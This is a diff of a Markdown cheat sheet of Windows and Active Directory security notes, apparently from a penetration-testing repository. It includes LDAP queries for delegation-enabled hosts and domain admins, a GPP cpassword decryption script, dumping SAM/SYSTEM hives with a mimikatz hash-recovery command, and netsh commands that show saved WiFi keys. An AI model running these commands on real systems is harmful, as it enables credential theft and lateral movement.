@@ -2,8 +2,9 @@ Windows
 =======
 
 
-## KerberosUnConstrainedDelegation
-More information here: https://adsecurity.org/?p=1667
+### KerberosUnConstrainedDelegation
+More information [here](https://adsecurity.org/?p=1667)
+
 ```Powershell
 $ Import-Module ActiveDirectory
 $ Get-ADComputer -Filter {(TrustedForDelegation -eq $True) -AND (PrimaryGroupID -eq 515)} -Properties 'TrustedForDelegation,TrustedToAuthForDelegation,servicePrincipalName,Description'
@@ -13,10 +14,12 @@ $ Get-ADComputer -Filter {(TrustedForDelegation -eq $True) -AND (PrimaryGroupID 
 $ $computers = (New-Object System.DirectoryServices.DirectorySearcher("(&(objectCategory=Computer)(primaryGroupID=515)(useraccountcontrol:1.2.840.113556.1.4.804:=524288))")).FindAll().Properties
 $ foreach($c in $computers) { echo "$($c.name) ($($c.useraccountcontrol))" }
 ```
-https://adsecurity.org/wp-content/uploads/2015/08/KerberosUnConstrainedDelegation-PowerShell-DiscoverServers2.png
 
-## Collect AD users information
-```Powershell
+![](https://adsecurity.org/wp-content/uploads/2015/08/KerberosUnConstrainedDelegation-PowerShell-DiscoverServers2.png)
+
+
+### Collect AD users information
+```Powerhell
 # Helping functions
 function Get-ADUserDirectoryEntry($user) {
     return (New-Object System.DirectoryServices.DirectorySearcher("(&(objectCategory=User)(samAccountName=$user))")).FindOne().GetDirectoryEntry()
@@ -51,16 +54,19 @@ foreach($user in $DomainAdmins) { echo "$($user.displayname) ($($user.samaccount
 (New-Object System.DirectoryServices.DirectorySearcher("(&(objectCategory=Computer)(cn=SCU44625))")).FindAll()
 ```
 
+
 ### LDAP Query structure
 The website [LdapWiki](https://ldapwiki.com/wiki/) explains how to write a LDAP query. For instance,
 if we want to use bitwise in ldap queries, we need to use some splecial arguments.
+
 There are two Bitwise operation Extensible Match Rules.
 ```
 1.2.840.113556.1.4.803 which is also referred to as LDAP_MATCHING_RULE_BIT_AND (Bitwise AND)
 1.2.840.113556.1.4.804 which is also referred to as LDAP_MATCHING_RULE_BIT_OR (Bitwise OR)
 ```
 
-## Decrypt GPO with cpassword
+
+### Decrypt GPO with cpassword
 ```python
 #!/usr/bin/python
 
@@ -98,36 +104,47 @@ if __name__ == "__main__":
     main()
 ```
 
-## Use Win32 API in Python
-Download then install the pip package pywin32 here: https://www.lfd.uci.edu/~gohlke/pythonlibs/#pywin32
+### Use Win32 API in Python
+Download then install the pip package `pywin32` here: [https://www.lfd.uci.edu/~gohlke/pythonlibs/#pywin32](https://www.lfd.uci.edu/~gohlke/pythonlibs/#pywin32)
 
-## Get NTP configuration server
+
+### Get NTP configuration server
 ```bash
 $ w32tm /query /status
 ```
 
-## Windows 10 versions
+
+### Windows 10 versions
 [Release Informations](https://docs.microsoft.com/fr-fr/windows/release-information/)
 
-## SAM and SYSTEM backup
+
+### SAM and SYSTEM backup
 ```
 reg save HKLM\SYSTEM SystemBkup.hiv
 reg save HKLM\SAM SamBkup.hiv
 ```
 
-## List Email aliases
+Then with `mimikatz` you can recover the hashes:
+```bash
+> lsadump::sam /system:SystemBkup.hiv /sam:SamBkup.hiv
+```
+
+
+### List Email aliases
 ```
 $ (Get-ADUser -Identity <user_ad_id> -Properties proxyAddresses).proxyAddresses
 ```
 
-## Truster Account
-https://www.sstic.org/media/SSTIC2014/SSTIC-actes/secrets_dauthentification_pisode_ii__kerberos_cont/SSTIC2014-Article-secrets_dauthentification_pisode_ii__kerberos_contre-attaque-bordes_2.pdf
+
+### Truster Account
+The [PDF](https://www.sstic.org/media/SSTIC2014/SSTIC-actes/secrets_dauthentification_pisode_ii__kerberos_cont/SSTIC2014-Article-secrets_dauthentification_pisode_ii__kerberos_contre-attaque-bordes_2.pdf) from SSTIC 2014 describes trusts accounts on Windows: 
 
 ```
 sAMAccountType: 805306370 = ( TRUST_ACCOUNT );
 ```
 
-## Compile .Net without Visual Studio
+
+### Compile .Net without Visual Studio
 ```
 > cd \Windows\Microsoft.NET\Framework\v4*
 > msbuild "path\to\SharpUp-master\SharpUp.sln" /t:Rebuild /p:Configuration=Release /p:Platform="Any CPU"
@@ -150,8 +167,8 @@ public class HelloWorld {
 }
 ```
 
-## List Wifi networks and password
-```
+### List Wifi networks and password
+```bash
 > netsh wlan show profile
 > netsh wlan show profile <WiFi name> key=clear
 ```
